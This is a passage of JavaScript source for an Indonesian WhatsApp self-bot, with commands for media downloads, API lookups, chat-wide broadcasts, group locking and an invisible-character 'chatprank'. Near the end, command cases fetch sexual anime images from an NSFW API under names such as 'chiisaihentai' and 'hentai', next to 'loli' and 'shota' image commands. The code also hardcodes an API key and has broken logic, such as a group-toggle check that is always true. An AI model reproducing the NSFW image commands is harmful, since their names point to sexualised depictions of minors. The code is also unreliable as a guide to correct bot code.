                    ini_txt += `\`\`\`Kata Dasar : ${lila[0].kata_dasar}\`\`\`\n`
                    ini_txt += `\`\`\`Pelafalan : ${lila[0].pelafalan}\`\`\`\n`
                    ini_txt += `\`\`\`Bentuk Tidak Baku : ${lila[0].bentuk_tidak_baku}\`\`\`\n\n`
                    for (var x of lila) {
                        ini_txt += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
                        ini_txt += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
                        ini_txt += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
                        ini_txt += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
                        ini_txt += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
                    }
                    reply(ini_txt)
                    break
                case 'jadwaltv':
                 reply('Loading...')
                    if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
                    channel = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
                    for (var x in get_result) {
                        ini_txt += `${x} - ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case 'jadwaltvnow':
                 reply('Otw!!')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV Now :\n`
                    for (var x in get_result) {
                        ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'kodepos':
                 reply('Otw!!')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kodepos?apikey=${lolkey}&query=${daerah}`)
                    get_result = get_result.result[0]
                    ini_txt = `Provinsi : ${get_result.province}\n`
                    ini_txt += `Kabupaten : ${get_result.city}\n`
                    ini_txt += `Kecamatan : ${get_result.subdistrict}\n`
                    ini_txt += `Kelurahan : ${get_result.urban}\n`
                    ini_txt += `Kode Pos : ${get_result.postalcode}`
                    reply(ini_txt)
                    break
                case 'jadwalbola':
                 reply('Bentar cok..')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Jadwal Bola :\n"
                    for (var x of get_result) {
                        ini_txt += `Hari : ${x.hari}\n`
                        ini_txt += `Jam : ${x.jam}\n`
                        ini_txt += `Event : ${x.event}\n`
                        ini_txt += `Match : ${x.match}\n`
                        ini_txt += `TV : ${x.tv}\n\n`
                    }
                    reply(ini_txt)
                    break
   case 'youtubestalk':
    reply ('Bntr cok...')
    anu = await fetchJson(`https://api.lolhuman.xyz/api/ytchannel?apikey=${lolkey}&query=${body.slice(14)}`)
    get = await getBuffer(`anu.result.chanel_picture`)
   teks = `*Channel id* : ${anu.result.channel_id}\n *Channel name* : ${anu.result.channel_name}\n *Description* : ${anu.result.channel_about}\n *Created channel* : ${anu.result.channel_created}`
   hexa.sendMessage(from, get, image, {quoted:ftoko,caption:teks})
   break
   
 case 'p':
  p = `nge tes doang`
  hexa.sendMessage(from, p, text, {quoted:ftoko})
contextInfo :{ externalAdReply: { } }
  break 
                case 'igdl':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=${lolkey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_type = image
                    if (ini_url.includes(".mp4")) ini_type = video
                    ini_buffer = await getBuffer(ini_url)
                    await hexa.sendMessage(from, ini_buffer, ini_type, { quoted: ftoko })
                    break
                case 'igdl2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/instagram2?apikey=${lolkey}&url=${ini_url}`)
                    ini_result = ini_url.result.media
                    for (var x of ini_result) {
                        ini_type = image
                        if (x.includes(".mp4")) ini_type = video
                        ini_buffer = await getBuffer(x)
                        await hexa.sendMessage(from, ini_buffer, ini_type, { quoted: ftoko })
                    }
                    break
					case 'myweb':
					 case 'infocreator':
					  
					 web = `Kunjungin web gua ya(Jangan di bully)\n https://FinoxAnggara.finxtxt.repl.co \n http://Finox999.github.io \n Web bucin: https://Buka-ya-hehehe.finxtxt.repl.co \nMy Github: github.com/Finox999 (follow bang`
					 hexa.sendMessage(from, web, text, {quoted:ftoko})
					 break
case 'twitter':
			case 'twitvideo':
		
			if (args.length == 0) return reply(`Contoh : ${prefix + command} https://twitter.com/PassengersMovie/status/821025484150423557`) 
			Kontol_pino = body.slice(9) 
			try {
			const yes = await hx.twitter(`${Kontol_pino}`) 
			console.log(yes)
			okeh_vid = await getBuffer(yes.SD)
			ini_text = `*• Description :* ${yes.desc} \n\nSupport `
			hexa.sendMessage(from, okeh_vid, video, {mimetype: 'video/mp4', filename: `HansBot.mp4`, quoted: mek, caption: ini_text}) 
			} catch (error) {
			console.log(error)
			}
			await limitAdd(sender)
			break
				case 'clearall':
hexa
					anu = await hexa.chats.all()
					hexa.setMaxListeners(25)
					for (let _ of anu) {
						hexa.deleteChat(_.jid)
					}
					reply('Sukses delete all chat :)')
					break
				case 'bc':
hexa
					if (args.length < 1) return reply('.......')
					anu = await hexa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							hexa.sendMessage(_.jid, buff, image, {caption: `*${body.slice(4)}*`})
						}
						reply('Suksess broadcast')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*${body.slice(4)}*`)
						}
						reply('Suksess broadcast')
					}
					break
case 'bc2':

					if (args.length < 1) return reply('.......')
					anu = await hexa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							hexa.sendMessage(_.jid, buff, image, {caption: `「 Broadcast 𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺 」*\n\n${body.slice(4)}`})
						}
						reply('*Suksess broadcast* ')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `「 Broadcast hexa Bot 」\n\n${body.slice(4)}`)
						}
						reply('*Suksess broadcast* ')
					}
					break


  break
    case 'jadibot':
    if(mek.key.fromMe) return reply('Tidak bisa jadibot di dalam bot')
    jadibot(reply,hexa,from)
    break
    case 'stopjadibot':
    if(mek.key.fromMe)return reply('tidak bisa stopjadibot kecuali owner')
    stopjadibot(reply)
    break
    case 'listbot':
    let tekss = '「 *LIST JADIBOT* 」\n'
    for(let i of listjadibot) {
    tekss += `*Nomor* : ${i.jid.split('@')[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
    }
    reply(tekss)
    break
case 'linkwa':
 case 'carigrup':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
    case 'igstory2': 
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'caripesan':
            if(!q)return reply('pesannya apa bang?')
            let v = await hexa.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await hexa.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
    case 'lirik2':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            hexa.sendMessage(from,ram,image,{quoted:ftoko,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
    case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara hexa`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await hexa.sendMessage(from,li,image,{quoted: mek})
            break
    case 'pinterest3':
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await hexa.sendMessage(from,di,image,{quoted: mek})
            break
    case 'playstore2':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
					case 'grup':
					if (args[0] === 'buka','open') {
					    reply(`\`\`\`✓Sukses Membuka Group\`\`\` *${groupMetadata.subject}*`)
						hexa.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup','close') {
						reply(`\`\`\`✓Sukses Menutup Group\`\`\` *${groupMetadata.subject}*`)
						hexa.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break
//--grup semua peserta
case 'closegc':
  hexa.updatePresence(from, Presence.recording)

  var nomor = mek.participant
  const close = {
text: `Grup ditutup oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *hanya admin* yang dapat mengirim pesan`,
contextInfo: {
  mentionedJid: [nomor]
}
  }
  hexa.groupSettingChange (from, GroupSettingChange.messageSend, true);
  reply(close)
  break

//--grup hanya admin
case 'opengc':
  case 'bukagc':
hexa.updatePresence(from, Presence.recording)

open = {
  text: `Grup dibuka oleh admin @${sender.split("@")[0]}\nsekarang *semua peserta* dapat mengirim pesan`,
  contextInfo: {
mentionedJid: [sender]
  }
}
hexa.groupSettingChange (from, GroupSettingChange.messageSend, false)
hexa.sendMessage(from, open, text, {
  quoted: mek
})
break
case 'chatprank':
hexa.updatePresence(from, Presence.recording)


if (args.length < 1) return reply(`*☒* Masukan teks\nContoh : ${prefix}chatprank p/unten`)
tels = body.slice(11)
var teks1 = tels.split("/")[0];
var teks2 = tels.split("/")[1];
hasil = `${teks1}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${teks2}`
hexa.sendMessage(from, hasil, text, {
  quoted: mek
})
break
case 'pepek':
tpoi = fs.readFileSync('./stik/thumb.jpeg')
					desco = `Visit Me`
					tite = `Lopia Owner Bot`
					urlo = `  https://linktr.ee/loplopia`
					 buiu = `owner bacot lu`
					var anu = {
					detectLinks: false
					}
					var mat = await hexa.generateLinkPreview(urlo)
					mat.title = tite;
					mat.description = desco;
					mat.jpegThumbnail = tpoi;
				   mat.canonicalUrl = buiu; 
					hexa.sendMessage(from, mat, MessageType.extendedText, anu, { quoted: ftoko })
break
case 'asamaulhusna2':
peler = fetchJson("https://myhuman.herokuapp.com/api/islam/asmaulhusna")
teks = `Nomor : ${data.nomor} \n *Latin* : ${data.latin} \n *Arabic": ${data.arabic} \n *Translate indonesia*: ${data.translation_id} \n *Translate inggris*: ${data.translation_en}`
hexa.sendMessage(from, text, {ftroli, caption:peler})
break

case 'source':
 case 'sc':
  case 'script':
   destagay = `Bot ini menggunakan sc \n Https://Github.com/Hexagonz/SELF-BOT`
   hexa.sendMessage(from, destagay, text, {quoted:fvideo})
   break
   case 'bug92':
    var tes = `tes`
    fakegroup(tes)
   break
  case 'blackpink':
   getBuffer(`https://lolhuman.herokuapp.com/api/textprome/blackpink?apikey=${lolkey}&text=${body.slice(11)}`) 
   .then((gambar) => {
    hexa.sendMessage(from, gambar, image, {quoted:ftoko})
   })
    break
case 'cekapikey':
p = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${body.slice(11)}`)
teks = `Username: ${p.result.username} \n Request: ${p.result.request} \n Today: ${p.result.today} \n AccountType: ${p.result.account_type} \n Expired: ${p.result.expired}`
hexa.sendMessage(from, teks, text, {quoted:ftoko})
break

case 'niatsholat':
 anu = await fetchJson(`https://api.lolhuman.xyz/api/niatsholat/${body.slice(12)}?apikey=DestaPrasApi`)
 y = `Name: ${anu.result.name} \n Arab: ${anu.result.ar} \n Latin: ${anu.result.latin} \n Indonesia: ${anu.result.id}`
 hexa.sendMessage(from, y, text, {quoted:ftoko})
 break
                    // Random Image //
                case 'art':
                case 'bts':
                case 'exo':
                case 'elf':
                case 'loli':
                case 'neko':
                case 'waifu':
                case 'shota':
                case 'husbu':
                case 'sagiri':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
                    getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted: ftoko })
                    })
                    break
                case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'hentai':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                    await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted: ftoko })
                    })
                    break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
